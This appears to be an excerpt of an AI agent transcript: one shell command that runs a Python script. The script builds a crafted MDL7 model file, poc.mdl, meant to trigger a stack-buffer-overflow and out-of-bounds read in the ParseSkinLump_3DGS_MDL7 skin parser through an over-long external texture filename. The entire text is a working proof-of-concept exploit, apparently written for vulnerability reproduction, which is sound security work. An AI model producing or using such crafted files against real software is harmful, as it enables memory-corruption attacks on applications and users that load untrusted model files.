Running command: cd /workspace && python3 -c "
import struct

# Build MDL7 file that triggers stack-buffer-overflow in ParseSkinLump_3DGS_MDL7
# The vulnerability: when iMasked == 0x7 (external file reference), 
# strlen(szCurrent) >= 1024 causes szFile.length >= 1024,
# and AddProperty reads iLen+5 bytes from a 1028-byte stack object.

# Header_MDL7 (48 bytes)
header = b''
header += b'MDL7'                    # ident[4]
header += struct.pack('<I', 0)       # version
header += struct.pack('<I', 0)       # bones_num
header += struct.pack('<I', 1)       # groups_num
header += struct.pack('<I', 0)       # data_size
header += struct.pack('<I', 0)       # entlump_size
header += struct.pack('<I', 0)       # medlump_size
header += struct.pack('<H', 16)      # bone_stc_size (AI_MDL7_BONE_STRUCT_SIZE__NAME_IS_NOT_THERE)
header += struct.pack('<H', 28)      # skin_stc_size (sizeof(Skin_MDL7))
header += struct.pack('<H', 16)      # colorvalue_stc_size (sizeof(ColorValue_MDL7))
header += struct.pack('<H', 0)       # material_stc_size
header += struct.pack('<H', 8)       # skinpoint_stc_size (sizeof(TexCoord_MDL7))
header += struct.pack('<H', 0)       # triangle_stc_size
header += struct.pack('<H', 0)       # mainvertex_stc_size
header += struct.pack('<H', 0)       # framevertex_stc_size
header += struct.pack('<H', 0)       # bonetrans_stc_size
header += struct.pack('<H', 0)       # frame_stc_size

# Group_MDL7 (44 bytes)
group = b''
group += struct.pack('<B', 1)        # typ = 1 (triangle-based mesh)
group += struct.pack('<B', 0)        # deformers
group += struct.pack('<B', 0)        # max_weights
group += struct.pack('<B', 0)        # _unused_
group += struct.pack('<i', 0)        # groupdata_size
group += b'test'.ljust(16, b'\x00')  # name[16]
group += struct.pack('<i', 1)        # numskins
group += struct.pack('<i', 0)        # num_stpts
group += struct.pack('<i', 0)        # numtris
group += struct.pack('<i', 0)        # numverts
group += struct.pack('<i', 0)        # numframes

# Skin_MDL7 (28 bytes)
skin = b''
skin += struct.pack('<B', 0x7)       # typ = 0x7 (external file reference)
skin += struct.pack('<BBB', 0, 0, 0) # _unused_[3]
skin += struct.pack('<i', 0)         # width
skin += struct.pack('<i', 1)         # height
skin += b'test'.ljust(16, b'\x00')   # texture_name[16]

# Filename string: 1024+ bytes of 'A' followed by null terminator
# This causes strlen >= 1024, making szFile.length >= 1024
# which triggers the OOB read in AddBinaryProperty
filename = b'A' * 1024 + b'\x00'

poc = header + group + skin + filename

with open('/workspace/poc.mdl', 'wb') as f:
    f.write(poc)

print(f'PoC size: {len(poc)} bytes')
print(f'Header: {len(header)} bytes')
print(f'Group: {len(group)} bytes')
print(f'Skin: {len(skin)} bytes')
print(f'Filename: {len(filename)} bytes')
"
